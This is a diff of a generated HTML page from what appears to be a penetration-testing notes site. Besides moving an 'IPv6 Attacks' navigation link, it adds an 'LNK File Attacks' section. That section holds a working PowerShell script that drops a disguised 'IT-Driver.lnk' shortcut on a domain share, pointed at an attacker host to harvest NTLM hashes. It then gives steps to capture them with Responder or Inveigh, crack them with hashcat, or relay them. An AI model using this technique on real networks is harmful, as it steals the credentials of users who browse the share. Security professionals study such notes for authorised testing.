@@ -838,7 +838,7 @@
   
   
   <span class="md-ellipsis">
-    Index
+    Under Construction
     
   </span>
   
@@ -2679,6 +2679,29 @@
   
   
     <li class="md-nav__item">
+      <a href="../IPv6%20Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    IPv6 Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../LLMNR%20Poisoning/" class="md-nav__link">
         
   
@@ -2972,29 +2995,6 @@
   
   <span class="md-ellipsis">
     Group Policy Abuse
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../Lateral%20Movement/IPv6%20Attacks/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    IPv6 Attacks
     
   </span>
   
@@ -3638,7 +3638,21 @@
 
   <h1>LNK File Attacks</h1>
 
-
+<p>Any writable directory (shares, nfs, locally) where users will list contents you can use a .lnk to steal hashes</p>
+<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nv">$objShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nv">$lnk</span> <span class="p">=</span> <span class="nv">$objShell</span><span class="p">.</span><span class="n">CreateShortcut</span><span class="p">(</span><span class="s2">&quot;\\DC01.domain.local\OpenShare\IT-Driver.lnk&quot;</span><span class="p">)</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">TargetPath</span> <span class="p">=</span> <span class="s2">&quot;\\&lt;AttackerIP&gt;\@ico.png&quot;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">WindowStyle</span> <span class="p">=</span> <span class="n">1</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">IconLocation</span> <span class="p">=</span> <span class="s2">&quot;%windir%\system32\shell32.dll, 3&quot;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">Description</span> <span class="p">=</span> <span class="s2">&quot;IT Driver&quot;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">HotKey</span> <span class="p">=</span> <span class="s2">&quot;Ctrl+Alt+O&quot;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">Save</span><span class="p">()</span>
+</span></code></pre></div>
+Monitor for traffic with <a href="https://github.com/SpiderLabs/Responder">Responder</a> on linux or <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> on windows. 
+Hash received? Try to crack it
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>hashcat -m 5600 userr.hash /usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+OR:  <a href="../../Lateral%20Movement/Relay%20Attacks/">Relay Attacks</a></p>
 
 
 
